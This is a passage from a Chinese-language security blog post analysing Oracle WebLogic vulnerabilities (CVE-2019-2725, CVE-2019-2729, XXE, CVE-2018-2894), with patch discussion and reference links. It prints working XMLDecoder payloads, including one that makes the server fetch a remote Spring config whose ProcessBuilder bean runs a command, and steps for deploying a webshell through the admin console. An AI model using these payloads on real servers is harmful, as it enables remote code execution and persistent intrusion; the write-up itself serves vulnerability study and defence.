<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 篇幅问题省略重复部分 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">class</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">void</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>http://10.254.254.254:8100/spel.xml<span class="tag">&lt;/<span class="name">string</span>&gt;</span> </span><br><span class="line">      <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">class</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">java</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>下一步就是构造恶意xml配置文件。由于weblogic继承的spring版本较老，不能通过spel表达式调用方法，所以xml内容需要微调：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>touch<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>/tmp/spel<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>下面从代码层面看一下：</p>
<p>XML解析过程略过，直接来到：<code>com.bea.core.repackaged.springframework.spring_1.2.0.0_2-5-3.jar!/com/bea/core/repackaged/springframework/context/support/FileSystemXmlApplicationContext.class</code></p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191206174512.png"></p>
<p>解析调用的过程不再细说，整个调用栈如下：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191206200804.png"></p>
<p>这个漏洞的时间线可以看<a target="_blank" rel="noopener" href="https://paper.seebug.org/909/">WebLogic RCE(CVE-2019-2725)漏洞之旅</a>，描述的非常清晰。</p>
<h5 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h5><p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190620123907.png"></p>
<p>补丁来自<a target="_blank" rel="noopener" href="https://kylingit.com/blog/cve-2019-2729-weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2019-2729 WEBLOGIC XMLDECODER反序列化漏洞分析</a>（已经记不清是第几次白嫖了），可以看到还是基于黑名单。</p>
<h4 id="CVE-2019-2729"><a href="#CVE-2019-2729" class="headerlink" title="CVE-2019-2729"></a>CVE-2019-2729</h4><p>我们在之前也提到过，xmldecoder的解析在jdk1.6与jdk1.7&#x2F;1.8之间是有区别的，正是这种区别导致了这次绕过，该漏洞只影响jdk1.6。</p>
<p>与jdk1.7一个标签对应一个handler的处理方式不同的是，jdk1.6将所有标签进行统一处理：</p>
<p><code>1.6.0.jdk/Contents/Classes/classes.jar!/com/sun/beans/ObjectHandler.class</code></p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191208171005.png"></p>
<p>不管是什么标签，只要有method属性，就会set。</p>
<p>继续向下看，array标签的特殊处理：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191208171301.png"></p>
<p>如果没有设置class属性，默认设置为Object。</p>
<p>在这种处理之下，即使我们传入的是array标签，仍然可以得到一个<code>java.lang.Object</code>对象，自然可以通过<code>forName</code>方法得到任意类的实例化。</p>
<p>最终<code>forName</code>方法会在<code>1.6.0.jdk/Contents/Classes/classes.jar!/java/beans/Statement.class</code>调用：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191208171556.png"></p>
<p>payload如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">array</span> <span class="attr">method</span>=<span class="string">&quot;forName&quot;</span>&gt;</span>				  </span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>oracle.toplink.internal.sessions.UnitOfWorkChangeSet<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span>&gt;</span></span><br><span class="line">      ......</span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<h5 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h5><p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190620124935.png"></p>
<p>白嫖是我快乐，补丁来自<a target="_blank" rel="noopener" href="https://kylingit.com/blog/cve-2019-2729-weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2019-2729 WEBLOGIC XMLDECODER反序列化漏洞分析</a>。</p>
<p>这次终于使用了白名单的方式，严格限制了能够使用的标签以及属性，期待下一次绕过的出现！</p>
<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>java中出现xxe的原因大同小异，多半是没有setFeature。当然在实际应用的利用过程中还有各种各样的坑，这里附上两篇<strong>Longofo</strong>师傅的文章：</p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/906/">WebLogic CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650 XXE漏洞分析</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1067/">WebLogic EJBTaglibDescriptor XXE漏洞(CVE-2019-2888)分析</a></p>
<h3 id="文件上传-CVE-2018-2894"><a href="#文件上传-CVE-2018-2894" class="headerlink" title="文件上传(CVE-2018-2894)"></a>文件上传(CVE-2018-2894)</h3><p>这是Weblogic Web Service Test Page处的任意文件上传漏洞，Web Service Test Page 在“生产模式”下默认不开启，同时weblogic部署的目录中有随机值，所以该漏洞有一定限制。同样附上文章：</p>
<p><a target="_blank" rel="noopener" href="https://chybeta.github.io/2018/07/21/WebLogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-2894-%E3%80%91/">WebLogic任意文件上传漏洞复现与分析 -【CVE-2018-2894 】</a></p>
<h3 id="小彩蛋"><a href="#小彩蛋" class="headerlink" title="小彩蛋"></a>小彩蛋</h3><p>习惯了weblogic这么多漏洞，如果有一天直接进了后台反而不会操作了，最尴尬的事情莫过于此，这个小彩蛋记录一下如何直接在weblogic后台部署一个webshell。</p>
<p>首先生成war包：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf l1.war l1.jsp</span><br></pre></td></tr></table></figure>

<p>在后台找到<strong>部署</strong>，然后上传我们构造好的war包，然后继续，后面一路默认+下一步就行了。</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191127183834.png"></p>
<h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247485058&idx=1&sn=d22b310acf703a32d938a7087c8e8704">WebLogic安全研究报告</a></p>
<p><a target="_blank" rel="noopener" href="http://d1iv3.me/2018/06/05/CVE-2015-4852-Weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90/">CVE-2015-4852 Weblogic 反序列化RCE分析</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/584/">Weblogic 反序列化漏洞(CVE-2018-2628)漫谈</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/5up3rc/weblogic_cmd/">https://github.com/5up3rc/weblogic_cmd&#x2F;</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/718/">Weblogic CVE-2018-3191 分析</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/162390">Oracle WebLogic RCE反序列化漏洞分析</a></p>
<p><a target="_blank" rel="noopener" href="http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/">Weblogic XMLDecoder RCE分析</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/909/">WebLogic RCE(CVE-2019-2725)漏洞之旅</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/206374.html">从CVE-2019-2725绕过谈Weblogic XML RCE的绕过史</a></p>
<p><a target="_blank" rel="noopener" href="https://kylingit.com/blog/cve-2019-2729-weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2019-2729 WEBLOGIC XMLDECODER反序列化漏洞分析</a></p>

        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>
        <div id="lv-container"></div>
        <div class="giscus"></div>
    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = ""
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

<script src="/js/index.js"></script>

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>






</html>
